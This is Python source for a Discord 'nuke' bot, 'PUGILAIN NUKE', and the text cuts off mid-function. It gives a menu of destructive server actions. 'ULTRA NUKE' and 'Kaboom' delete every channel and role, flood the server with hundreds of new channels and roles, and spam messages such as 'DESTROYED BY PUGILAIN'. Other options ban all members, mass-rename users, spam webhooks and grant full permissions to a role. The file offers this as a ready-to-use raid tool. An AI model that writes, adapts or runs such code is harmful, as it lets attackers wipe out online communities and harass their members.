import discord
from discord.ext import commands
import asyncio
import random
import os
import sys
import time
import logging
import aiohttp

logging.getLogger('discord.http').setLevel(logging.CRITICAL)
logging.getLogger('discord.gateway').setLevel(logging.CRITICAL)

R = '\033[91m'
W = '\033[97m'
B = '\033[94m'
BD = '\033[1m'
RT = '\033[0m'

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def rand_color():
    return random.choice([R, W, B])

def cprint(text):
    color = rand_color()
    print(f"{color}{BD}{text}{RT}")

def loading_bar(duration=2):
    clear()
    print(f"{R}{BD}")
    print("""
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░█████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░██▌░░░░░░░███░░░░███████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░▀█░░░░░░░░░░██░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░█░░░░░░░░░░██░░░░░░░░░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░██░░░░░░░░░░██░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░████░░░░░░░░█░░░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░███████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░▀█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░███████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░


    """)
    print(f"{RT}")
    
    bar_length = 50
    for i in range(bar_length + 1):
        progress = i / bar_length
        filled = int(bar_length * progress)
        bar = '█' * filled + '░' * (bar_length - filled)
        percent = int(progress * 100)
        color = rand_color()
        print(f"\r{color}{BD}[{bar}] {percent}%{RT}", end='', flush=True)
        time.sleep(duration / bar_length)
    print()
    clear()

def banner():
    clear()
    lines = [
"░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░░░░░░░░░█████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░░░░░░░████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░██▌░░░░░░░███░░░░███████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░▀█░░░░░░░░░░██░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░░░█░░░░░░░░░░██░░░░░░░░░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░░░██░░░░░░░░░░██░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░░░░████░░░░░░░░█░░░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░░░░░░███████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░░░░░░░░░░░░░░░▀█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░░░░░░░░░████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░░░░░░░░░░░███████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
"░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░"
        

    ]
    for line in lines:
        cprint(line)

def menu():
    options = [
        "[01] ULTRA NUKE      [19] Kaboom        [37] Purge     ",
        "[02] Ban All         [20] Join Nuke     [38] Show Bans ",
        "[03] Del Channels    [21] Del Cats      [39] Show Cats ",
        "[04] Del Roles       [22] Del Voice     [40] Show Emoji",
        "[05] Channel Bomb    [23] Spam Hooks    [41] Show Voice",
        "[06] Role Bomb       [24] Grant Perms   [42] Bot Config",
        "[07] Spam All        [25] Check Perms   [43] Create Cat",
        "[08] Change Name     [26] Move Role     [44] Create VC ",
        "[09] Change Icon     [27] Ban Member    [45] Create Ch ",
        "[10] Create Role     [28] Unban         [46] Del All CC",
        "[11] Mass Nick       [29] Add Role      [47] Role To   ",
        "[12] Del Emojis      [30] Del Chan      [48] Move Role ",
        "[13] Del Webhooks    [31] Del Role      [49] Auto Nick ",
        "[14] Leave Server    [32] Del Cat       [50] Auto Status",
        "[15] Server Info     [33] Del Emoji     [51] Change St ",
        "[16] Show Channels   [34] Add Emoji     [52] Link      ",
        "[17] Show Roles      [35] Bot Status    [53] Check Perm",
        "[18] Show Members    [36] Disable CM    [54] Grant All ",
        "[55] Del All Roles   [56] Ban All       [57] DEL ALL   ",
        "[58] REFRESH         [0]  EXIT                         "
    ]
    for opt in options:
        cprint(opt)

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)
bot.target_guild = None

def get_token():
    clear()
    print(f"{R}{BD}")
    print("""
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░█████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░██▌░░░░░░░███░░░░███████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░▀█░░░░░░░░░░██░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░█░░░░░░░░░░██░░░░░░░░░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░██░░░░░░░░░░██░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░████░░░░░░░░█░░░░░░░░███░░░░░░░░░░░░░░░░░░PUGILAIN NUKE. 6.1V░░░░░░░░░░
░░░░░░░░░░░░░███████████████████░░░░░░░░░░░░░░░░░░░░░                   ░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░▀█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░███████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░


    """)
    print(f"{RT}")
    return input(f"{R}{BD}[?] Bot Token: {RT}")

@bot.event
async def on_ready():
    banner()
    cprint("BOT ONLINE")
    cprint(f"Name: {bot.user.name}")
    cprint(f"ID: {bot.user.id}")
    cprint(f"Servers: {len(bot.guilds)}")
    await select_server()

async def select_server():
    if len(bot.guilds) > 0:
        cprint("SELECT SERVER")
        for i, guild in enumerate(bot.guilds):
            cprint(f"[{i+1}] {guild.name}")
        
        try:
            choice = int(input(f"{R}{BD}[?] Server number: {RT}"))
            if 1 <= choice <= len(bot.guilds):
                bot.target_guild = bot.guilds[choice-1]
                cprint(f"Target: {bot.target_guild.name}")
                await asyncio.sleep(0.5)
                await show_menu()
            else:
                cprint("[!] Invalid selection")
                await asyncio.sleep(1)
                await select_server()
        except ValueError:
            cprint("[!] Invalid input")
            await asyncio.sleep(1)
            await select_server()
        except:
            cprint("[!] Error selecting server")
            await asyncio.sleep(1)
            await select_server()
    else:
        cprint("[!] Bot is not in any server")
        cprint("[!] Invite the bot to a server first")
        input(f"{R}{BD}[?] Press enter to retry...{RT}")
        await select_server()

async def show_menu():
    while True:
        banner()
        menu()
        try:
            choice = input(f"{R}{BD}[?] Option: {RT}")
            
            if choice == "1":
                await ultra_nuke()
            elif choice == "2":
                await ban_all()
            elif choice == "3":
                await delete_channels()
            elif choice == "4":
                await delete_roles()
            elif choice == "5":
                try:
                    amount = int(input(f"{R}{BD}[?] Number of channels (max 499): {RT}"))
                    if amount > 499:
                        amount = 499
                    await channel_bomb(amount)
                except:
                    cprint("[!] Invalid number")
                    await asyncio.sleep(0.5)
            elif choice == "6":
                try:
                    amount = int(input(f"{R}{BD}[?] Number of roles (max 250): {RT}"))
                    if amount > 250:
                        amount = 250
                    await role_bomb(amount)
                except:
                    cprint("[!] Invalid number")
                    await asyncio.sleep(0.5)
            elif choice == "7":
                await spam_all()
            elif choice == "8":
                name = input(f"{R}{BD}[?] New name: {RT}")
                await change_server_name(name)
            elif choice == "9":
                await change_server_icon()
            elif choice == "10":
                await create_role()
            elif choice == "11":
                nick = input(f"{R}{BD}[?] Nick (empty for default): {RT}")
                await mass_nickname(nick)
            elif choice == "12":
                await delete_emojis()
            elif choice == "13":
                await delete_webhooks()
            elif choice == "14":
                await leave_server()
                break
            elif choice == "15":
                await show_server_info()
            elif choice == "16":
                await show_channels()
            elif choice == "17":
                await show_roles()
            elif choice == "18":
                await show_members()
            elif choice == "19":
                await kaboom()
            elif choice == "20":
                await join_nuke()
            elif choice == "21":
                await delete_categories()
            elif choice == "22":
                await delete_voice_channels()
            elif choice == "23":
                await spam_webhooks()
            elif choice == "24":
                await grant_all_perms()
            elif choice == "25":
                await check_role_perms()
            elif choice == "26":
                await move_role()
            elif choice == "27":
                member_id = input(f"{R}{BD}[?] Member ID: {RT}")
                await ban_member(member_id)
            elif choice == "28":
                user_id = input(f"{R}{BD}[?] User ID: {RT}")
                await unban_member(user_id)
            elif choice == "29":
                member_id = input(f"{R}{BD}[?] Member ID: {RT}")
                role_id = input(f"{R}{BD}[?] Role ID: {RT}")
                await add_role(member_id, role_id)
            elif choice == "30":
                channel_id = input(f"{R}{BD}[?] Channel ID: {RT}")
                await del_channel(channel_id)
            elif choice == "31":
                role_id = input(f"{R}{BD}[?] Role ID: {RT}")
                await del_role(role_id)
            elif choice == "32":
                cat_id = input(f"{R}{BD}[?] Category ID: {RT}")
                await del_cat(cat_id)
            elif choice == "33":
                emoji_id = input(f"{R}{BD}[?] Emoji ID: {RT}")
                await del_emoji(emoji_id)
            elif choice == "34":
                await add_emoji()
            elif choice == "35":
                status = input(f"{R}{BD}[?] Status (online/idle/dnd/offline): {RT}")
                await bot_status(status)
            elif choice == "36":
                await disable_cm()
            elif choice == "37":
                try:
                    amount = int(input(f"{R}{BD}[?] Number of messages: {RT}"))
                    await purge(amount)
                except:
                    cprint("[!] Invalid number")
                    await asyncio.sleep(0.5)
            elif choice == "38":
                await show_bans()
            elif choice == "39":
                await show_cats()
            elif choice == "40":
                await show_emojis()
            elif choice == "41":
                await show_voice()
            elif choice == "42":
                await bot_config()
            elif choice == "43":
                name = input(f"{R}{BD}[?] Category name: {RT}")
                await create_cat(name)
            elif choice == "44":
                name = input(f"{R}{BD}[?] VC name: {RT}")
                await create_vc(name)
            elif choice == "45":
                name = input(f"{R}{BD}[?] Channel name: {RT}")
                await create_ch(name)
            elif choice == "46":
                await del_all_cc()
            elif choice == "47":
                member_id = input(f"{R}{BD}[?] Member ID: {RT}")
                role_id = input(f"{R}{BD}[?] Role ID: {RT}")
                await role_to(member_id, role_id)
            elif choice == "48":
                role_id = input(f"{R}{BD}[?] Role ID: {RT}")
                pos = input(f"{R}{BD}[?] Position: {RT}")
                await move_role_pos(role_id, pos)
            elif choice == "49":
                nick = input(f"{R}{BD}[?] Nick: {RT}")
                await auto_nick(nick)
            elif choice == "50":
                status = input(f"{R}{BD}[?] Status: {RT}")
                await auto_status(status)
            elif choice == "51":
                status = input(f"{R}{BD}[?] Status text: {RT}")
                await change_status(status)
            elif choice == "52":
                await show_link()
            elif choice == "53":
                role_id = input(f"{R}{BD}[?] Role ID: {RT}")
                await check_role_permissions(role_id)
            elif choice == "54":
                role_id = input(f"{R}{BD}[?] Role ID: {RT}")
                await grant_all_permissions(role_id)
            elif choice == "55":
                await del_all_roles()
            elif choice == "56":
                await ban_all()
            elif choice == "57":
                await del_all()
            elif choice == "58":
                await refresh()
            elif choice == "0":
                cprint("[!] Closing...")
                await bot.close()
                sys.exit(0)
            else:
                cprint("[!] Invalid option")
                await asyncio.sleep(0.5)
        except Exception as e:
            cprint(f"[!] Error: {e}")
            await asyncio.sleep(0.5)

async def ultra_nuke():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] ULTRA NUKE FLASH EXECUTION...")
    
    async def delete_everything():
        tasks = []
        for channel in bot.target_guild.channels:
            tasks.append(channel.delete())
        for role in bot.target_guild.roles:
            if role.name != "@everyone":
                tasks.append(role.delete())
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def create_channels():
        for batch in range(5):
            tasks = []
            for i in range(100):
                name = f"nuked-{batch*100+i}"
                tasks.append(bot.target_guild.create_text_channel(name))
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.8)
    
    async def create_roles():
        tasks = []
        for i in range(50):
            tasks.append(bot.target_guild.create_role(name=f"PUGILAIN-{i}"))
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def spam_channels():
        emojis = ["⛧", "☠︎", "⛓", "⚡", "🔥", "💀", "🖤", "🔪", "🩸"]
        texts = ["PUGILAIN TEAM NUKE", "DESTROYED BY PUGILAIN", "PUGILAIN ON TOP", "GET REKT"]
        tasks = []
        for channel in bot.target_guild.text_channels[:50]:
            emoji_line = " ".join(random.choice(emojis) for _ in range(10))
            text = random.choice(texts)
            message = f"{emoji_line}\n{text}\n{emoji_line}"
            tasks.append(channel.send(message))
        await asyncio.gather(*tasks, return_exceptions=True)
    
    await delete_everything()
    await asyncio.sleep(0.5)
    await asyncio.gather(create_channels(), create_roles(), return_exceptions=True)
    await spam_channels()
    
    cprint("[✓] ULTRA NUKE COMPLETED!")
    await asyncio.sleep(0.3)

async def ban_all():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Banning all members...")
    tasks = [member.ban() for member in bot.target_guild.members if member != bot.user]
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] All members banned")
    await asyncio.sleep(0.3)

async def delete_channels():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Deleting channels...")
    tasks = [channel.delete() for channel in bot.target_guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] Channels deleted")
    await asyncio.sleep(0.3)

async def delete_roles():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Deleting roles...")
    tasks = [role.delete() for role in bot.target_guild.roles if role.name != "@everyone"]
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] Roles deleted")
    await asyncio.sleep(0.3)

async def channel_bomb(amount):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint(f"[!] Creating {amount} channels...")
    for batch in range(0, amount, 100):
        batch_amount = min(100, amount - batch)
        tasks = [bot.target_guild.create_text_channel(f"pugilain-{batch+i}") for i in range(batch_amount)]
        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.8)
    cprint("[✓] Channel bomb completed")
    await asyncio.sleep(0.3)

async def role_bomb(amount):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint(f"[!] Creating {amount} roles...")
    tasks = [bot.target_guild.create_role(name=f"PUGILAIN-{i}") for i in range(amount)]
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] Role bomb completed")
    await asyncio.sleep(0.3)

async def spam_all():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    emojis = ["⛧", "☠︎", "⛓", "⚡", "🔥", "💀", "🖤", "🔪", "🩸"]
    texts = ["PUGILAIN TEAM NUKE", "DESTROYED BY PUGILAIN", "PUGILAIN ON TOP", "GET REKT"]
    
    cprint("[!] SPAMMING...")
    
    tasks = []
    for channel in bot.target_guild.text_channels[:50]:
        emoji_line = " ".join(random.choice(emojis) for _ in range(15))
        text = random.choice(texts)
        message = f"{emoji_line}\n{text}\n{emoji_line}"
        tasks.append(channel.send(message))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] SPAM COMPLETED!")
    await asyncio.sleep(0.3)

async def kaboom():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] KABOOM! Flash nuke...")
    
    tasks = [channel.delete() for channel in bot.target_guild.channels]
    tasks += [role.delete() for role in bot.target_guild.roles if role.name != "@everyone"]
    await asyncio.gather(*tasks, return_exceptions=True)
    
    for batch in range(5):
        tasks = [bot.target_guild.create_text_channel(f"kaboom-{batch*100+i}") for i in range(100)]
        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.8)
    
    emojis = ["⛧", "☠︎", "⛓", "⚡", "🔥", "💀", "🖤"]
    tasks = []
    for channel in bot.target_guild.text_channels[:50]:
        emoji_line = " ".join(random.choice(emojis) for _ in range(10))
        message = f"{emoji_line}\nPUGILAIN TEAM NUKE\n{emoji_line}"
        tasks.append(channel.send(message))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] KABOOM completed")
    await asyncio.sleep(0.3)

async def join_nuke():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Join Nuke...")
    
    tasks = [channel.delete() for channel in bot.target_guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    
    for batch in range(5):
        tasks = [bot.target_guild.create_text_channel(f"joined-nuke-{batch*100+i}") for i in range(100)]
        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.8)
    
    emojis = ["⛧", "☠︎", "⛓", "⚡", "🔥", "💀", "🖤"]
    tasks = []
    for channel in bot.target_guild.text_channels[:50]:
        emoji_line = " ".join(random.choice(emojis) for _ in range(10))
        message = f"{emoji_line}\nPUGILAIN TEAM NUKE\n{emoji_line}"
        tasks.append(channel.send(message))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] Join Nuke completed")
    await asyncio.sleep(0.3)

async def delete_categories():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Deleting categories...")
    tasks = [category.delete() for category in bot.target_guild.categories]
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] Categories deleted")
    await asyncio.sleep(0.3)

async def delete_voice_channels():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Deleting voice channels...")
    tasks = [channel.delete() for channel in bot.target_guild.voice_channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] Voice channels deleted")
    await asyncio.sleep(0.3)

async def spam_webhooks():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Creating webhooks...")
    tasks = []
    for channel in bot.target_guild.text_channels[:20]:
        tasks.append(channel.create_webhook(name="PUGILAIN"))
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] Webhooks spammed")
    await asyncio.sleep(0.3)

async def grant_all_perms():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        role_id = input(f"{R}{BD}[?] Role ID: {RT}")
        role = bot.target_guild.get_role(int(role_id))
        if role:
            perms = discord.Permissions.all()
            await role.edit(permissions=perms)
            cprint(f"[✓] Max permissions granted to: {role.name}")
        else:
            cprint("[!] Role not found")
    except:
        cprint("[!] Invalid role ID")
    await asyncio.sleep(0.3)

async def check_role_perms():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        role_id = input(f"{R}{BD}[?] Role ID: {RT}")
        role = bot.target_guild.get_role(int(role_id))
        if role:
            perms = role.permissions
            dangerous = []
            if perms.administrator:
                dangerous.append("Administrator")
            if perms.manage_guild:
                dangerous.append("Manage Guild")
            if perms.ban_members:
                dangerous.append("Ban Members")
            if perms.kick_members:
                dangerous.append("Kick Members")
            if perms.manage_channels:
                dangerous.append("Manage Channels")
            if perms.manage_roles:
                dangerous.append("Manage Roles")
            if perms.manage_webhooks:
                dangerous.append("Manage Webhooks")
            if perms.mention_everyone:
                dangerous.append("Mention Everyone")
            
            if dangerous:
                cprint(f"[!] Dangerous permissions of {role.name}:")
                for perm in dangerous:
                    cprint(f"  - {perm}")
            else:
                cprint(f"[✓] {role.name} has no dangerous permissions")
            input(f"{R}{BD}[?] Press enter to continue...{RT}")
        else:
            cprint("[!] Role not found")
            await asyncio.sleep(0.3)
    except:
        cprint("[!] Invalid role ID")
        await asyncio.sleep(0.3)

async def move_role():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        role_id = input(f"{R}{BD}[?] Role ID: {RT}")
        position = int(input(f"{R}{BD}[?] New position: {RT}"))
        role = bot.target_guild.get_role(int(role_id))
        if role:
            await role.edit(position=position)
            cprint(f"[✓] Role {role.name} moved")
        else:
            cprint("[!] Role not found")
    except:
        cprint("[!] Invalid input")
    await asyncio.sleep(0.3)

async def ban_member(member_id):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        member = bot.target_guild.get_member(int(member_id))
        if member:
            await member.ban()
            cprint(f"[✓] Banned: {member.name}")
        else:
            cprint("[!] Member not found")
    except:
        cprint("[!] Invalid member ID")
    await asyncio.sleep(0.3)

async def unban_member(user_id):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        user = await bot.fetch_user(int(user_id))
        await bot.target_guild.unban(user)
        cprint(f"[✓] Unbanned: {user.name}")
    except:
        cprint("[!] User not found or not banned")
    await asyncio.sleep(0.3)

async def add_role(member_id, role_id):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        member = bot.target_guild.get_member(int(member_id))
        role = bot.target_guild.get_role(int(role_id))
        if member and role:
            await member.add_roles(role)
            cprint(f"[✓] Role {role.name} added to {member.name}")
        else:
            cprint("[!] Member or role not found")
    except:
        cprint("[!] Invalid input")
    await asyncio.sleep(0.3)

async def del_channel(channel_id):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        channel = bot.target_guild.get_channel(int(channel_id))
        if channel:
            await channel.delete()
            cprint(f"[✓] Channel deleted: {channel.name}")
        else:
            cprint("[!] Channel not found")
    except:
        cprint("[!] Invalid channel ID")
    await asyncio.sleep(0.3)

async def del_role(role_id):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        role = bot.target_guild.get_role(int(role_id))
        if role:
            await role.delete()
            cprint(f"[✓] Role deleted: {role.name}")
        else:
            cprint("[!] Role not found")
    except:
        cprint("[!] Invalid role ID")
    await asyncio.sleep(0.3)

async def del_cat(cat_id):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        category = bot.target_guild.get_channel(int(cat_id))
        if category and isinstance(category, discord.CategoryChannel):
            await category.delete()
            cprint(f"[✓] Category deleted: {category.name}")
        else:
            cprint("[!] Category not found")
    except:
        cprint("[!] Invalid category ID")
    await asyncio.sleep(0.3)

async def del_emoji(emoji_id):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        emoji = bot.target_guild.get_emoji(int(emoji_id))
        if emoji:
            await emoji.delete()
            cprint(f"[✓] Emoji deleted: {emoji.name}")
        else:
            cprint("[!] Emoji not found")
    except:
        cprint("[!] Invalid emoji ID")
    await asyncio.sleep(0.3)

async def add_emoji():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Paste emoji image URL:")
    url = input(f"{R}{BD}[?] URL: {RT}")
    name = input(f"{R}{BD}[?] Emoji name: {RT}")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    image_data = await resp.read()
                    emoji = await bot.target_guild.create_custom_emoji(name=name, image=image_data)
                    cprint(f"[✓] Emoji created: {emoji.name}")
                else:
                    cprint("[!] Invalid URL")
    except:
        cprint("[!] Error creating emoji")
    await asyncio.sleep(0.3)

async def bot_status(status):
    try:
        if status == "online":
            await bot.change_presence(status=discord.Status.online)
        elif status == "idle":
            await bot.change_presence(status=discord.Status.idle)
        elif status == "dnd":
            await bot.change_presence(status=discord.Status.dnd)
        elif status == "offline":
            await bot.change_presence(status=discord.Status.offline)
        cprint("[✓] Status changed")
    except:
        cprint("[!] Error changing status")
    await asyncio.sleep(0.3)

async def disable_cm():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        await bot.target_guild.edit(community=False)
        cprint("[✓] Community mode disabled")
    except:
